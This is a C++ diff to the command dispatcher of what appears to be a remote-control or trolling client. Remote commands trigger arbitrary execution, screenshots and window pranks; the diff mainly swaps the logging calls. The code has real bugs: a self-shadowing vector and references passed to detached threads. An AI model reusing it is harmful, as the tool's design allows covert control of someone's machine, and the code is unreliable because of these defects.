@@ -2,12 +2,12 @@
 
 CommandHandler::CommandHandler()
 {
-    std::cout << "[Command Handler] [+] Created instance!\n";
+    device::print("[Command Handler] [+] Created instance!");
 }
 
 CommandHandler::~CommandHandler()
 {
-    std::cout << "[Command Handler] [+] Destroyed instance!\n";
+    device::print("[Command Handler] [+] Destroyed instance!");
 }
 
 void CommandHandler::setInput(std::string input)
@@ -17,7 +17,7 @@ void CommandHandler::setInput(std::string input)
 
 void CommandHandler::clean()
 {
-    std::cout << "[Command Handler] [+] Cleaning input!\n";
+    device::print("[Command Handler] [+] Cleaning input!");
     std::istringstream iss(rawInput);
     std::string token;
 
@@ -27,60 +27,70 @@ void CommandHandler::clean()
 
         if (!token.empty())
         {
-            std::cout << "[Command Handler :: clean()] [~] Token: " << token << "\n";
+            device::print("[Command Handler] [+] Token: " + token + "");
             args.push_back(token);
         }
     }
-    //std::cout << args[0] << "A" << args[1] << "\n";
+    //std::cout << args[0] << "A" << args[1] << "";
 }
 
 void CommandHandler::callFunction()
 {
+    bool x = false;
     clean();
-    std::cout << "[Command Handler] [+] Calling function!\n";
+    device::print("[Command Handler] [+] Calling function!");
 
     if (args[0] == "Message")
     {
         std::vector<std::string> args = {args[1], args[2]};
         std::thread t(commands::showMessageBox, std::ref(args));
         t.detach();
+        x = true;
     }
 
     if (args[0] == "Execute")
     {
         std::thread t(commands::execute, std::ref(args[1]));
         t.detach();
+        x = true;
     }
 
     if (args[0] == "Cringe")
     {
         std::thread t(commands::cringe);
         t.detach();
+        x = true;
     }
 
     if (args[0] == "screentest")
     {
         std::thread t(commands::Screenshot_C);
         t.detach();
+        x = true;
     }
     
     if(args[0] == "randomPixel")
     {
         std::thread t(commands::randomPixel, std::stoi(args[1]), std::stoi(args[2]), 10);
         t.detach();
+        x = true;
     }
 
     if(args[0] == "WindowTroll")
     {
         std::thread t(commands::WindowTroll);
         t.detach();
+        x = true;
     }
 
     if(args[0] == "Exit")
     {
         commands::StopProcess();
-    } else {
-        std::cout << "[Command Handler] [!] Command not found!\n";
+    }
+
+    if(x == false)
+    {
+        device::print("[Command Handler] [!] Command not found!");
     }
 }
 
@@ -93,6 +103,12 @@ void CommandHandler::DebugPrint()
         {
             std::cout << args[i] << " ";
         }
-        std::cout << "\n";
+        std::cout << "";
     }
+}
+
+void CommandHandler::clear()
+{
+    args.clear();
+    rawInput.clear();
 }
